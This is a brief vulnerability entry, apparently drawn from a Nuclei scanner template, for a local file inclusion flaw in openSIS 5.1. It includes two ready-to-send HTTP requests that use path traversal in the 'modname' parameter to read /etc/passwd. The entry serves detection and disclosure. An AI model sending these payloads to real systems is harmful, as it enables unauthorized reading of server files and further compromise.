# Vulnerability: openSIS 5.1 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`opensis-lfi.yaml`)

## Description
openSIS 5.1 is vulnerable to local file inclusion and allows attackers to obtain potentially sensitive information by executing arbitrary local scripts in the context of the web server process. This may allow the attacker to compromise the application and computer; other attacks are also possible.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
GET {{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
```

